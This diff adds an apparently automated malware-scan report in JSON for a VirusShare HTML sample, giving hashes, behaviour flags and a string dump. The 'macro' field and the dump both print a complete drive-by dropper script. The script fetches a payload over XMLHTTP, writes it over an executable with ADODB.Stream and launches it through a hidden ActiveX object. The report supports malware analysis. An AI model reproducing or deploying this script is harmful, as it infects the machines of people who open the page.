@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "ADODB.Stream": "May create a text file",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "Open": "May open a file",
+            "SaveToFile": "May create a text file",
+            "Write": "May write to a file"
+        },
+        "macro": "<script language=\"javascript\">\n\n     function LaunchExecutable(ObjSrc)\n     {\n       tagstyle='style=\"display:none\"'; \n       ObjCLSID=\"clsid:11111111-1111-1111-11111-111111111111\";\n       sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjSrc+'\" '+tagstyle+'></object>';\n       try\n       {\n          document.writeln(sObject);\n       }\n       catch(e){}  \n     }\n\n     function getPath(url) \n       {\n         start = url.indexOf('http:')\n         end = url.indexOf('page1.chm')\n         return url.substring(start, end);\n       }\n    \n     payloadURL = getPath(location.href)+'banner.htm';\n    \n     ObjSrc=\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplorer.exe\";\n\n     var oXMLHTTP = new ActiveXObject(\"Microsoft.XMLHTTP\"); \n     oXMLHTTP.Open(\"GET\",payloadURL,0); \n     oXMLHTTP.Send();   \n\n     try\n     {\n       var oStream = new ActiveXObject('ADODB.Stream'); \n       oStream.Mode = 3; \n       oStream.Type = 1; \n       oStream.Open(); \n       oStream.Write(oXMLHTTP.responseBody); \n       oStream.SaveToFile(ObjSrc,2);\n     }\n     catch(e){}\n\n     setTimeout(\"LaunchExecutable(ObjSrc)\",500);\n   \n</script>"
+    },
+    "filename": "VirusShare_1b03c1512dc022c0233ec203e33fa03e",
+    "filesize": 1159,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1b03c1512dc022c0233ec203e33fa03e",
+        "sha1": "d286e062c065aaa5814d2f9091b749d628d6ba24",
+        "sha256": "f3419237c3d862dae828078858d17aa2d341de8883ab02e196916bed5d5ea0fa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"javascript\">",
+            "     function LaunchExecutable(ObjSrc)",
+            "     {",
+            "       tagstyle='style=\"display:none\"'; ",
+            "       ObjCLSID=\"clsid:11111111-1111-1111-11111-111111111111\";",
+            "       sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjSrc+'\" '+tagstyle+'></object>';",
+            "       try",
+            "       {",
+            "          document.writeln(sObject);",
+            "       }",
+            "       catch(e){}  ",
+            "     }",
+            "     function getPath(url) ",
+            "       {",
+            "         start = url.indexOf('http:')",
+            "         end = url.indexOf('page1.chm')",
+            "         return url.substring(start, end);",
+            "       }",
+            "    ",
+            "     payloadURL = getPath(location.href)+'banner.htm';",
+            "    ",
+            "     ObjSrc=\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplorer.exe\";",
+            "     var oXMLHTTP = new ActiveXObject(\"Microsoft.XMLHTTP\"); ",
+            "     oXMLHTTP.Open(\"GET\",payloadURL,0); ",
+            "     oXMLHTTP.Send();   ",
+            "     try",
+            "     {",
+            "       var oStream = new ActiveXObject('ADODB.Stream'); ",
+            "       oStream.Mode = 3; ",
+            "       oStream.Type = 1; ",
+            "       oStream.Open(); ",
+            "       oStream.Write(oXMLHTTP.responseBody); ",
+            "       oStream.SaveToFile(ObjSrc,2);",
+            "     }",
+            "     catch(e){}",
+            "     setTimeout(\"LaunchExecutable(ObjSrc)\",500);",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.287073",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
